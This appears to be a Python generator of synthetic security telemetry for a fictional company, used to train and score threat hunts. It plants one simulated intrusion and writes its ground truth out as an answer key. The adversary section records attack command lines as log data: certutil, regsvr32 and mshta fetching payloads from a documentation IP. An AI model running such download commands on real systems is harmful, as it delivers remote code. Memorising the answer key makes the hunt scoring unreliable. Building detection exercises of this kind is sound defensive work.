#!/usr/bin/env python3
"""Deterministic synthetic telemetry generator for Northwind Logistics.

Fictional company. 14 days, ~60 workstations + 3 servers + 2 domain controllers,
~70 users. Six log sources (process, network, dns, auth, service, files) written
as gzip JSON Lines into data/. A fixed seed makes the decompressed content
byte-for-byte reproducible (tests/test_generator.py asserts this; the compressed
bytes can differ between zlib builds such as zlib and zlib-ng).

The benign baseline is deliberately noisy in the ways that fool naive hunts:
  * an update agent that beacons on a jittered ~60-min interval (looks like C2),
  * NTP and telemetry check-ins that are *very* regular (low CV, but allowlisted),
  * a nightly backup job that writes large archives (looks like staging),
  * IT admins who legitimately run rare tools,
  * a legacy service account that requests RC4 Kerberos tickets (but for 1 SPN),
  * CDN domains with many random-looking subdomains (looks like DNS tunneling).

Hidden inside is one intrusion. Its ground truth is written to
data/ground_truth.json and is read only by the tests and `python -m hunt score`;
the hunts themselves never read it. Everything is synthetic; IPs use RFC 5737
documentation ranges and all domains end in .example/.test.

Run:  python scripts/generate_dataset.py   (writes into ../data)
"""

from __future__ import annotations

import argparse
import datetime as dt
import gzip
import hashlib
import json
import os
import random
from typing import Dict, List

SEED = 20260907
DAYS = 14
START = dt.datetime(2026, 9, 7, 0, 0, 0, tzinfo=dt.timezone.utc)  # a Monday

# ---------------------------------------------------------------------------
# Inventory
# ---------------------------------------------------------------------------
N_WKS = 60
WORKSTATIONS = [f"WKS-{i:04d}" for i in range(1, N_WKS + 1)]
SERVERS = ["SRV-0001", "SRV-0002", "SRV-0003"]
DCS = ["DC-0001", "DC-0002"]
ALL_HOSTS = WORKSTATIONS + SERVERS + DCS

COMPROMISED_HOST = "WKS-0042"
COMPROMISED_USER = "rbaxter"
PERSIST_HOST = COMPROMISED_HOST

# Users: regular staff, IT admins, service accounts.
REGULAR_USERS = [f"user{i:03d}" for i in range(1, 61)]
# give a few memorable names so findings read like a real SOC
NAMED_USERS = ["rbaxter", "achen", "jpatel", "kowusu", "mstone", "lnguyen"]
IT_ADMINS = ["adm.tcole", "adm.rkhan", "adm.dvoss"]
SERVICE_ACCOUNTS = ["svc-backup", "svc-sql", "svc-web", "svc-legacy", "svc-scan"]
USERS = REGULAR_USERS + NAMED_USERS + IT_ADMINS + SERVICE_ACCOUNTS

ADMIN_HOSTS = ["WKS-0003", "WKS-0011", "WKS-0027"]  # the IT admins' workstations

# External benign destinations (in the "known software/infra inventory")
ALLOWLIST_DOMAINS = {
    "updates.contoso-software.example",   # update agent (jittered, high CV)
    "time.ntp-pool.example",              # NTP-like, very regular but allowlisted
    "telemetry.vendor-apm.example",       # server APM telemetry, metronome-regular, allowlisted
    "ocsp.ca-provider.example",           # cert revocation checks
}
SYNC_DOMAIN = "sync.collab-suite.example"  # event-driven file sync: chatty, bursty
SYNC_HOSTS = [f"WKS-{i:04d}" for i in range(5, 60, 4)][:15]
KNOWN_CDNS = {"g.akamai-cdn.example", "cloudfront-dist.example"}

POPULAR_DOMAINS = [
    "portal.northwind.example", "mail.northwind.example", "intranet.northwind.example",
    "news.example", "weather.example", "docs.example", "search.example",
    "cdn.jsdelivr.example", "fonts.gstatic.example", "www.vendor-portal.example",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/129.0",
    "Microsoft-CryptoAPI/10.0",
]

# Adversary infrastructure (documentation ranges / .example only)
C2_DOMAIN = "cdn-sync-07.telemetry-edge.example"
C2_IP = "203.0.113.45"
EXFIL_DOMAIN = "eu-west.cloudbox-storage.example"
EXFIL_IP = "203.0.113.77"
DNS_TUNNEL_DOMAIN = "sync.dataxfil-svc.example"
LOLBIN_IP = "198.51.100.23"

SPNS = [
    "MSSQLSvc/srv01.northwind.example:1433",
    "MSSQLSvc/srv02.northwind.example:1433",
    "HTTP/web01.northwind.example",
    "HTTP/portal.northwind.example",
    "CIFS/fs01.northwind.example",
    "LDAP/dc01.northwind.example",
    "HOST/srv03.northwind.example",
    "TERMSRV/vdi01.northwind.example",
    "FTP/transfer.northwind.example",
    "MSSQLSvc/finance-db.northwind.example:1433",
]


def _fake_hash(seed_text: str) -> str:
    """A stable, obviously-synthetic SHA256-shaped hex string."""
    return hashlib.sha256(seed_text.encode()).hexdigest()


def _iso(epoch: float) -> str:
    return dt.datetime.fromtimestamp(epoch, tz=dt.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


class Gen:
    def __init__(self, seed: int = SEED):
        self.r = random.Random(seed)
        self.sources: Dict[str, List[dict]] = {
            "process": [], "network": [], "dns": [], "auth": [], "service": [], "files": [],
        }
        # assign each regular/named user a primary workstation
        self.user_host: Dict[str, str] = {}
        pool = list(WORKSTATIONS)
        self.r.shuffle(pool)
        humans = REGULAR_USERS + NAMED_USERS
        for i, u in enumerate(humans):
            self.user_host[u] = pool[i % len(pool)]
        self.user_host[COMPROMISED_USER] = COMPROMISED_HOST
        for i, a in enumerate(IT_ADMINS):
            self.user_host[a] = ADMIN_HOSTS[i % len(ADMIN_HOSTS)]

    def add(self, source: str, ev: dict):
        self.sources[source].append(ev)

    # -- time helpers -------------------------------------------------------
    def day_start(self, day: int) -> float:
        return (START + dt.timedelta(days=day)).timestamp()

    def is_weekend(self, day: int) -> bool:
        return (START + dt.timedelta(days=day)).weekday() >= 5

    def business_hour(self) -> int:
        # weighted toward 9-17
        return self.r.choices(
            population=list(range(6, 21)),
            weights=[1, 2, 5, 9, 10, 10, 8, 6, 9, 10, 9, 7, 5, 3, 2],
            k=1,
        )[0]

    def t(self, day: int, hour: int | None = None) -> float:
        if hour is None:
            hour = self.business_hour()
        base = self.day_start(day) + hour * 3600
        return base + self.r.randint(0, 3599) + self.r.random()

    # ======================================================================
    # Benign baseline
    # ======================================================================
    def gen_benign_processes(self):
        # common lineage templates: (gparent, parent, child)
        benign_chains = [
            ("explorer.exe", "outlook.exe", "WINWORD.EXE"),
            ("explorer.exe", "outlook.exe", "EXCEL.EXE"),
            ("explorer.exe", "chrome.exe", "chrome.exe"),
            ("explorer.exe", "teams.exe", "teams.exe"),
            ("services.exe", "svchost.exe", "svchost.exe"),
            ("explorer.exe", "EXCEL.EXE", "EXCEL.EXE"),
            ("explorer.exe", "OUTLOOK.EXE", "chrome.exe"),
            ("wininit.exe", "services.exe", "svchost.exe"),
            ("explorer.exe", "WINWORD.EXE", "splwow64.exe"),
            ("explorer.exe", "onedrive.exe", "onedrive.exe"),
        ]
        for day in range(DAYS):
            weekend = self.is_weekend(day)
            for host in ALL_HOSTS:
                if host in DCS or host in SERVERS:
                    n = self.r.randint(6, 12)
                else:
                    n = self.r.randint(2, 6) if weekend else self.r.randint(14, 26)
                owner = next((u for u, h in self.user_host.items() if h == host), "user000")
                for _ in range(n):
                    g, p, c = self.r.choice(benign_chains)
                    self._proc(host, owner, g, p, c, self.t(day))
                # IT admins run legitimately rare tools on their own boxes
                if host in ADMIN_HOSTS and not weekend and self.r.random() < 0.5:
                    tool = self.r.choice(["psexec.exe", "nmap.exe", "procmon.exe", "wireshark.exe"])
                    self._proc(host, owner, "explorer.exe", "cmd.exe", tool, self.t(day),
                               cmdline=f"{tool} /accepteula")
        # benign LOLBin baseline: certutil used by IT for cert-store checks (no network args)
        for _ in range(9):
            h = self.r.choice(ADMIN_HOSTS + WORKSTATIONS[:10])
            o = next((u for u, hh in self.user_host.items() if hh == h), "user000")
            self._proc(h, o, "cmd.exe", "cmd.exe", "certutil.exe", self.t(self.r.randint(0, 13)),
                       cmdline=self.r.choice(["certutil.exe -store my", "certutil.exe -verify ca.cer"]))
        # regsvr32 registering an installed COM component from Program Files (benign)
        for h in ADMIN_HOSTS:
            o = next((u for u, hh in self.user_host.items() if hh == h), "user000")
            self._proc(h, o, "msiexec.exe", "msiexec.exe", "regsvr32.exe", self.t(2),
                       cmdline=r'regsvr32.exe /s "C:\Program Files\Contoso\shellext.dll"')

    def _proc(self, host, user, gparent, parent, child, epoch, cmdline=None, img_dir=None):
        img_dir = img_dir or r"C:\Windows\System32"
        image = f"{img_dir}\\{child}"
        self.add("process", {
            "ts": _iso(epoch), "epoch": round(epoch, 3), "source": "process",
            "host": host, "user": user,
            "pid": self.r.randint(1000, 60000), "ppid": self.r.randint(400, 60000),
            "image": image, "process": child,
            "parent_image": f"C:\\Windows\\System32\\{parent}", "parent": parent,
            "gparent": gparent,
            "cmdline": cmdline or f"{child.lower()}",
            "sha256": _fake_hash(child + img_dir),
        })

    def gen_benign_network(self):
        for day in range(DAYS):
            weekend = self.is_weekend(day)
            for host in WORKSTATIONS:
                owner = next((u for u, h in self.user_host.items() if h == host), "user000")
                nconn = self.r.randint(2, 6) if weekend else self.r.randint(18, 34)
                for _ in range(nconn):
                    dom = self.r.choice(POPULAR_DOMAINS)
                    self._net(host, owner, dom, self._resolve(dom), self.t(day),
                              bytes_out=self.r.randint(300, 4000),
                              bytes_in=self.r.randint(800, 90000))
                # update agent: ~hourly check-in with HEAVY jitter (high CV) -> benign beacon look-alike
                self._interval_beacon(host, "svc-update", "updates.contoso-software.example",
                                      self._resolve("updates.contoso-software.example"),
                                      day, period=3600, jitter=0.5,
                                      bytes_out=(250, 60), bytes_in=(900, 300),
                                      ua="Contoso-Updater/4.2")
                # NTP-like: very regular (LOW CV) but allowlisted destination
                self._interval_beacon(host, owner, "time.ntp-pool.example",
                                      self._resolve("time.ntp-pool.example"),
                                      day, period=2048, jitter=0.03,
                                      bytes_out=(90, 2), bytes_in=(90, 2), ua="", port=123)
                # event-driven file sync: far MORE connections than any implant,
                # but bursty (exponential gaps) -> defeats naive frequency ranking
                if host in SYNC_HOSTS and not weekend:
                    epoch = self.day_start(day) + 8 * 3600 + self.r.randint(0, 900)
                    end = self.day_start(day) + 17 * 3600
                    while epoch < end:
                        self._net(host, owner, SYNC_DOMAIN, self._resolve(SYNC_DOMAIN), epoch,
                                  bytes_out=self.r.randint(400, 250000),
                                  bytes_in=self.r.randint(400, 120000), ua="CollabSync/23.4")
                        epoch += self.r.expovariate(1 / 75.0)
            # APM telemetry from servers: 24x7, metronome-regular, allowlisted
            for host in SERVERS:
                self._interval_beacon(host, "svc-web", "telemetry.vendor-apm.example",
                                      self._resolve("telemetry.vendor-apm.example"),
                                      day, period=900, jitter=0.05,
                                      bytes_out=(1200, 80), bytes_in=(400, 40), ua="APM-Agent/2",
                                      start_hour=0, end_hour=24)

    def _interval_beacon(self, host, user, domain, ip, day, period, jitter,
                         bytes_out, bytes_in, ua, start_hour=7, end_hour=20, port=443):
        epoch = self.day_start(day) + start_hour * 3600 + self.r.randint(0, period)
        end = self.day_start(day) + end_hour * 3600
        while epoch < end:
            self._net(host, user, domain, ip, epoch,
                      bytes_out=max(1, int(self.r.gauss(*bytes_out))),
                      bytes_in=max(1, int(self.r.gauss(*bytes_in))), ua=ua, port=port)
            step = period * (1 + self.r.uniform(-jitter, jitter))
            epoch += max(5.0, step)

    def _net(self, host, user, domain, ip, epoch, bytes_out, bytes_in, ua=None, port=443):
        self.add("network", {
            "ts": _iso(epoch), "epoch": round(epoch, 3), "source": "network",
            "host": host, "user": user,
            "dst_ip": ip, "dst_domain": domain, "dst_port": port,
            "bytes_out": int(bytes_out), "bytes_in": int(bytes_in),
            "user_agent": ua if ua is not None else self.r.choice(USER_AGENTS),
            "protocol": {443: "tls", 123: "ntp"}.get(port, "tcp"),
        })

    def _resolve(self, domain: str) -> str:
        # deterministic private/benign public mapping
        h = int(hashlib.sha256(domain.encode()).hexdigest(), 16)
        if domain.endswith("northwind.example"):
            return f"10.20.{h % 254}.{(h >> 8) % 254}"
        return f"198.51.100.{h % 254}"

    def gen_benign_dns(self):
        for day in range(DAYS):
            for host in WORKSTATIONS:
                owner = next((u for u, h in self.user_host.items() if h == host), "user000")
                for _ in range(self.r.randint(6, 16)):
                    dom = self.r.choice(POPULAR_DOMAINS + sorted(ALLOWLIST_DOMAINS))
                    self._dns(host, owner, dom, self.t(day))
                # CDN with many random-looking but SHORT subdomains (benign look-alike for H05)
                for _ in range(self.r.randint(2, 6)):
                    cdn = self.r.choice(sorted(KNOWN_CDNS))
                    label = "".join(self.r.choice("abcdef0123456789") for _ in range(self.r.randint(4, 8)))
                    self._dns(host, owner, f"{label}.{cdn}", self.t(day))

    def _dns(self, host, user, qname, epoch, qtype="A", answer=None):
        self.add("dns", {
            "ts": _iso(epoch), "epoch": round(epoch, 3), "source": "dns",
            "host": host, "user": user, "qname": qname, "qtype": qtype,
            "answer": answer if answer is not None else self._resolve(qname.split(".", 1)[-1]),
        })

    def gen_benign_auth(self):
        for day in range(DAYS):
            weekend = self.is_weekend(day)
            for user in REGULAR_USERS + NAMED_USERS:
                if weekend and self.r.random() < 0.8:
                    continue
                host = self.user_host.get(user, "WKS-0001")
                # interactive logon in the morning
                self._auth(host, 4624, user, logon_type=2, src_ip="-",
                           epoch=self.t(day, hour=self.r.choice([7, 8, 9])))
                # a handful of network logons to file/print during the day
                for _ in range(self.r.randint(1, 4)):
                    self._auth(host, 4624, user, logon_type=3,
                               src_ip=f"10.20.{self.r.randint(1,40)}.{self.r.randint(1,254)}",
                               epoch=self.t(day))
                # occasional typo -> 4625
                if self.r.random() < 0.15:
                    self._auth(host, 4625, user, logon_type=2, src_ip="-", epoch=self.t(day))
                # Kerberos TGS requests (benign: AES, 1-2 SPNs)
                for _ in range(self.r.randint(1, 3)):
                    self._tgs(host, user, self.r.choice(SPNS), "0x12", self.t(day))
            # service accounts: service logons (type 5) + network
            for sa in SERVICE_ACCOUNTS:
                shost = {"svc-backup": "SRV-0001", "svc-sql": "SRV-0002",
                         "svc-web": "SRV-0003", "svc-legacy": "SRV-0002",
                         "svc-scan": "SRV-0001"}.get(sa, "SRV-0001")
                for _ in range(self.r.randint(2, 5)):
                    self._auth(shost, 4624, sa, logon_type=5, src_ip="-", epoch=self.t(day))
                # svc-legacy uses RC4 but only for its single SPN (benign look-alike for H03)
                if sa == "svc-legacy":
                    for _ in range(self.r.randint(3, 6)):
                        self._tgs(shost, sa, SPNS[0], "0x17", self.t(day))
            # one human works late before a deadline (benign off-hours look-alike for H07)
            if day == 10:
                self._auth(self.user_host["achen"], 4624, "achen", logon_type=2, src_ip="-",
                           epoch=self.day_start(day) + 23 * 3600 + 2400)
            # nightly vulnerability scan: off-hours but NON-interactive network logons
            for _ in range(3):
                self._auth("SRV-0001", 4624, "svc-scan", logon_type=3,
                           src_ip=f"10.20.{self.r.randint(1,40)}.{self.r.randint(1,254)}",
                           epoch=self.day_start(day) + 2 * 3600 + self.r.randint(0, 3000))
            # admins: privileged logons -> 4672
            for adm in IT_ADMINS:
                self._auth(self.user_host[adm], 4624, adm, logon_type=2, src_ip="-", epoch=self.t(day))
                self._auth(self.user_host[adm], 4672, adm, logon_type=2, src_ip="-", epoch=self.t(day))

    def _auth(self, host, event_id, user, logon_type, src_ip, epoch):
        self.add("auth", {
            "ts": _iso(epoch), "epoch": round(epoch, 3), "source": "auth",
            "host": host, "event_id": event_id, "user": user,
            "logon_type": logon_type, "src_ip": src_ip,
        })

    def _tgs(self, host, user, spn, enc, epoch):
        self.add("auth", {
            "ts": _iso(epoch), "epoch": round(epoch, 3), "source": "auth",
            "host": host, "event_id": 4769, "user": user,
            "service_name": spn, "ticket_encryption": enc,
            "src_ip": f"10.20.{self.r.randint(1,40)}.{self.r.randint(1,254)}",
        })

    def gen_benign_services(self):
        common = [
            ("Windows Update Medic Service", r"C:\Windows\System32\svchost.exe"),
            ("Contoso Updater", r"C:\Program Files\Contoso\updater.exe"),
            ("Northwind EDR Agent", r"C:\Program Files\NW-EDR\edr.exe"),
        ]
        for host in ALL_HOSTS:
            for name, path in common:
                self.add("service", {
                    "ts": _iso(self.t(0, hour=3)), "epoch": round(self.t(0, 3), 3),
                    "source": "service", "host": host, "event_id": 7045,
                    "name": name, "image_path": path, "sha256": _fake_hash(name + path),
                    "account": "LocalSystem",
                })
        # a niche LOB service on just the finance servers (rare-but-benign for H06)
        for host in ["SRV-0002"]:
            self.add("service", {
                "ts": _iso(self.t(1, hour=4)), "epoch": round(self.t(1, 4), 3),
                "source": "service", "host": host, "event_id": 7045,
                "name": "FinanceLedger Sync", "image_path": r"C:\Program Files\FinLedger\sync.exe",
                "sha256": _fake_hash("FinanceLedger"), "account": "svc-sql",
            })
        # IT inventory task on the 3 admin workstations only (rare-ish, benign)
        for host in ADMIN_HOSTS:
            self.add("service", {
                "ts": _iso(self.t(0, hour=9)), "epoch": round(self.t(0, 9), 3),
                "source": "service", "host": host, "event_id": 4698,
                "task_name": r"\NW-IT\InventoryScan",
                "image_path": r"C:\Program Files\NW-IT\invscan.exe",
                "sha256": _fake_hash("invscan"), "account": "SYSTEM",
            })
        # scheduled tasks for updates on every host (identical across fleet)
        for host in ALL_HOSTS:
            self.add("service", {
                "ts": _iso(self.t(0, hour=2)), "epoch": round(self.t(0, 2), 3),
                "source": "service", "host": host, "event_id": 4698,
                "task_name": r"\Microsoft\Windows\UpdateOrchestrator\Refresh",
                "image_path": r"C:\Windows\System32\usoclient.exe",
                "sha256": _fake_hash("usoclient"), "account": "SYSTEM",
            })

    def gen_benign_files(self):
        # nightly backup job writes a big archive on the backup server (staging look-alike)
        for day in range(DAYS):
            size = self.r.randint(900_000_000, 1_400_000_000)
            epoch = self.day_start(day) + 1 * 3600 + self.r.randint(0, 1800)
            self.add("files", {
                "ts": _iso(epoch), "epoch": round(epoch, 3), "source": "files",
                "host": "SRV-0001", "user": "svc-backup",
                "path": rf"D:\Backups\nightly-{day:02d}.7z",
                "filename": f"nightly-{day:02d}.7z", "size_bytes": size,
                "ext": "7z", "action": "create",
            })
            # and the backup ships to the INTERNAL backup target (not external) -> excluded
            self._net("SRV-0001", "svc-backup", "backup-target.northwind.example",
                      self._resolve("backup-target.northwind.example"),
                      epoch + 120, bytes_out=size // 2, bytes_in=2000, ua="NW-Backup/3")
        # occasional small user archives (zip of a report)
        for day in range(DAYS):
            for _ in range(self.r.randint(1, 4)):
                host = self.r.choice(WORKSTATIONS)
                owner = next((u for u, h in self.user_host.items() if h == host), "user000")
                self.add("files", {
                    "ts": _iso(self.t(day)), "epoch": round(self.t(day), 3), "source": "files",
                    "host": host, "user": owner,
                    "path": rf"C:\Users\{owner}\Documents\report.zip",
                    "filename": "report.zip", "size_bytes": self.r.randint(50_000, 5_000_000),
                    "ext": "zip", "action": "create",
                })

    # ======================================================================
    # Adversary (ground truth)
    # ======================================================================
    def gen_adversary(self):
        gt = {
            "scenario": "Synthetic intrusion in Northwind Logistics (fictional). "
                        "Beachhead on WKS-0042 via phished user rbaxter.",
            "compromised_host": COMPROMISED_HOST,
            "compromised_user": COMPROMISED_USER,
            "all_synthetic": True,
            "hunts": {},
        }
        host = COMPROMISED_HOST
        user = COMPROMISED_USER

        # H01: C2 beacon ~300s, 20% jitter, low volume, days 3..13
        first_beacon = None
        for day in range(3, DAYS):
            # day 3: the implant starts minutes after the Excel-launched loader (10:15)
            offset = 10 * 3600 + 20 * 60 if day == 3 else 0
            epoch = self.day_start(day) + offset + self.r.randint(0, 300)
            end = self.day_start(day) + 24 * 3600
            while epoch < end:
                if first_beacon is None:
                    first_beacon = epoch
                self._net(host, user, C2_DOMAIN, C2_IP, epoch,
                          bytes_out=max(1, int(self.r.gauss(780, 22))),
                          bytes_in=max(1, int(self.r.gauss(410, 25))),
                          ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
                epoch += 300 * (1 + self.r.uniform(-0.2, 0.2))
        # DNS for the c2 domain so it resolves to the doc IP
        self._dns(host, user, C2_DOMAIN, first_beacon - 1, answer=C2_IP)
        gt["hunts"]["H01"] = {
            "technique": "T1071.001",
            "true_positive": {"host": host, "dst_domain": C2_DOMAIN, "dst_ip": C2_IP},
            "benign_lookalikes": ["updates.contoso-software.example (high CV, allowlisted)",
                                  "time.ntp-pool.example (allowlisted)",
                                  "telemetry.vendor-apm.example (low CV, allowlisted)",
                                  "sync.collab-suite.example (high volume, bursty)"],
            "first_activity": _iso(first_beacon),
        }

        # H02: rare lineage excel.exe -> cmd.exe -> rundll32.exe, DLL in user temp
        lin_epoch = self.day_start(3) + 10 * 3600 + 900
        self._proc(host, user, "explorer.exe", "EXCEL.EXE", "cmd.exe", lin_epoch,
                   cmdline="cmd.exe /c rundll32")
        self._proc(host, user, "EXCEL.EXE", "cmd.exe", "rundll32.exe", lin_epoch + 2,
                   cmdline=rf"rundll32.exe C:\Users\{user}\AppData\Local\Temp\u3d9a.dll,Start",
                   img_dir=r"C:\Windows\System32")
        gt["hunts"]["H02"] = {
            "technique": "T1204.002",
            "true_positive": {"host": host, "gparent": "EXCEL.EXE",
                              "parent": "cmd.exe", "child": "rundll32.exe"},
            "benign_lookalikes": ["IT admin tools (psexec/nmap/procmon/wireshark) on admin hosts"],
            "first_activity": _iso(lin_epoch),
        }

        # H03: Kerberoasting burst - RC4 TGS for 9 SPNs in ~3 min
        base = self.day_start(4) + 11 * 3600 + 600
        roast_spns = SPNS[:9]
        for i, spn in enumerate(roast_spns):
            self._tgs(host, user, spn, "0x17", base + i * 18 + self.r.random() * 3)
        gt["hunts"]["H03"] = {
            "technique": "T1558.003",
            "true_positive": {"user": user, "distinct_spns": len(roast_spns), "encryption": "0x17"},
            "benign_lookalikes": ["svc-legacy RC4 TGS for a single SPN", "users requesting AES TGS"],
            "first_activity": _iso(base),
        }

        # H04: LOLBin downloads (command-line text only; documentation IP)
        lb = self.day_start(3) + 10 * 3600 + 1000
        self._proc(host, user, "cmd.exe", "cmd.exe", "certutil.exe", lb,
                   cmdline=f"certutil.exe -urlcache -split -f http://{LOLBIN_IP}/update.txt %TEMP%\\u.txt")
        self._proc(host, user, "cmd.exe", "cmd.exe", "regsvr32.exe", lb + 30,
                   cmdline=f"regsvr32.exe /s /n /u /i:http://{LOLBIN_IP}/x.sct scrobj.dll")
        self._proc(host, user, "cmd.exe", "cmd.exe", "mshta.exe", lb + 60,
                   cmdline=f"mshta.exe http://{LOLBIN_IP}/a.hta")
        gt["hunts"]["H04"] = {
            "technique": "T1105",
            "true_positive": {"host": host, "binaries": ["certutil.exe", "regsvr32.exe", "mshta.exe"]},
            "benign_lookalikes": ["certutil.exe -store/-verify (no network argument)",
                                  "regsvr32.exe registering a Program Files DLL"],
            "first_activity": _iso(lb),
        }

        # H05: DNS tunneling - long high-entropy subdomains under one domain
        tun_first = None
        for day in range(5, 9):
            for _ in range(self.r.randint(40, 70)):
                label = "".join(self.r.choice("abcdefghijklmnopqrstuvwxyz0123456789")
                                for _ in range(self.r.randint(28, 45)))
                epoch = self.t(day)
                if tun_first is None or epoch < tun_first:
                    tun_first = epoch
                self._dns(host, user, f"{label}.{DNS_TUNNEL_DOMAIN}", epoch,
                          qtype="TXT", answer="-")
        gt["hunts"]["H05"] = {
            "technique": "T1048.003",
            "true_positive": {"host": host, "registered_domain": "dataxfil-svc.example",
                              "tunnel_zone": DNS_TUNNEL_DOMAIN},
            "benign_lookalikes": sorted(KNOWN_CDNS),
            "first_activity": _iso(tun_first),
        }

        # H06: fleet-rare new service on exactly 1 host, user-writable path, late first-seen
        svc_epoch = self.day_start(3) + 10 * 3600 + 1200
        self.add("service", {
            "ts": _iso(svc_epoch), "epoch": round(svc_epoch, 3), "source": "service",
            "host": PERSIST_HOST, "event_id": 7045,
            "name": "WinSyncHelper",
            "image_path": rf"C:\Users\{user}\AppData\Local\Temp\wsh.exe",
            "sha256": _fake_hash("WinSyncHelper-implant"), "account": "LocalSystem",
        })
        gt["hunts"]["H06"] = {
            "technique": "T1543.003",
            "true_positive": {"host": PERSIST_HOST, "name": "WinSyncHelper"},
            "benign_lookalikes": ["FinanceLedger Sync (1 host, Program Files, service account)",
                                  "\\NW-IT\\InventoryScan (3 admin hosts, Program Files)"],
            "first_activity": _iso(svc_epoch),
        }

        # H07: off-hours interactive logon by a service account that never does interactive
        logon_epoch = self.day_start(6) + 2 * 3600 + 600  # 02:10 local, off-hours
        self._auth("SRV-0001", 4624, "svc-backup", logon_type=10,  # RemoteInteractive (RDP)
                   src_ip="10.20.42.42", epoch=logon_epoch)
        self._auth("SRV-0001", 4672, "svc-backup", logon_type=10, src_ip="10.20.42.42",
                   epoch=logon_epoch + 1)
        gt["hunts"]["H07"] = {
            "technique": "T1078.002",
            "true_positive": {"user": "svc-backup", "logon_type": 10, "host": "SRV-0001"},
            "benign_lookalikes": ["achen late-evening type-2 logon on own workstation",
                                  "svc-scan nightly type-3 network logons"],
            "first_activity": _iso(logon_epoch),
        }

        # H08: data staging (7z in C:\PerfLogs) then external exfil spike
        stage_epoch = self.day_start(9) + 1 * 3600 + 300  # 01:05, off-hours
        stage_size = self.r.randint(240_000_000, 360_000_000)
        self.add("files", {
            "ts": _iso(stage_epoch), "epoch": round(stage_epoch, 3), "source": "files",
            "host": host, "user": user,
            "path": r"C:\PerfLogs\archive.7z", "filename": "archive.7z",
            "size_bytes": stage_size, "ext": "7z", "action": "create",
        })
        # outbound spike to cloud-storage-looking external domain within minutes
        self._dns(host, user, EXFIL_DOMAIN, stage_epoch + 200, answer=EXFIL_IP)
        for i in range(8):
            self._net(host, user, EXFIL_DOMAIN, EXFIL_IP, stage_epoch + 240 + i * 25,
                      bytes_out=self.r.randint(25_000_000, 40_000_000), bytes_in=1500,
                      ua="rclone/v1.65")
        gt["hunts"]["H08"] = {
            "technique": "T1567.002",
            "true_positive": {"host": host, "path": r"C:\PerfLogs\archive.7z",
                              "dst_domain": EXFIL_DOMAIN},
            "benign_lookalikes": ["nightly backup 7z shipped to internal backup-target"],
            "first_activity": _iso(stage_epoch),
        }

        return gt


def write_sources(gen: Gen, out_dir: str):
    for source, events in gen.sources.items():
        # stable sort by time; Python's sort is stable so equal epochs keep creation order
        events.sort(key=lambda e: e["epoch"])
        fp = os.path.join(out_dir, f"{source}.jsonl.gz")
        payload = "".join(json.dumps(ev, sort_keys=True, separators=(",", ":")) + "\n" for ev in events)
        # mtime=0 and no embedded filename -> byte-stable gzip output across runs on one zlib build
        with open(fp, "wb") as raw, gzip.GzipFile(filename="", mode="wb", fileobj=raw,
                                                  compresslevel=9, mtime=0) as gz:
            gz.write(payload.encode("utf-8"))


def build(seed: int = SEED, benign_only: bool = False) -> Gen:
    """Generate every source in memory. The adversary is drawn last so the benign
    events are identical with and without it."""
    gen = Gen(seed=seed)
    gen.gen_benign_processes()
    gen.gen_benign_network()
    gen.gen_benign_dns()
    gen.gen_benign_auth()
    gen.gen_benign_services()
    gen.gen_benign_files()
    gen.ground_truth = None if benign_only else gen.gen_adversary()
    return gen


def main(argv=None):
    ap = argparse.ArgumentParser(description="Generate Northwind synthetic telemetry (deterministic).")
    ap.add_argument("--out", default=os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "data"))
    ap.add_argument("--seed", type=int, default=SEED)
    ap.add_argument("--benign-only", action="store_true",
                    help="omit the adversary (for false-positive testing); no ground truth written")
    args = ap.parse_args(argv)

    os.makedirs(args.out, exist_ok=True)
    gen = build(seed=args.seed, benign_only=args.benign_only)
    gt = gen.ground_truth
    write_sources(gen, args.out)

    if gt is not None:
        with open(os.path.join(args.out, "ground_truth.json"), "w", encoding="utf-8") as fh:
            json.dump(gt, fh, indent=2, sort_keys=True)
            fh.write("\n")

    counts = {s: len(v) for s, v in gen.sources.items()}
    total = sum(counts.values())
    size = sum(os.path.getsize(os.path.join(args.out, f"{s}.jsonl.gz")) for s in gen.sources)
    print(f"wrote {total} events to {args.out}")
    for s, c in counts.items():
        print(f"  {s:8s} {c:7d}")
    print(f"  total gz size: {size/1_000_000:.2f} MB")


if __name__ == "__main__":
    main()
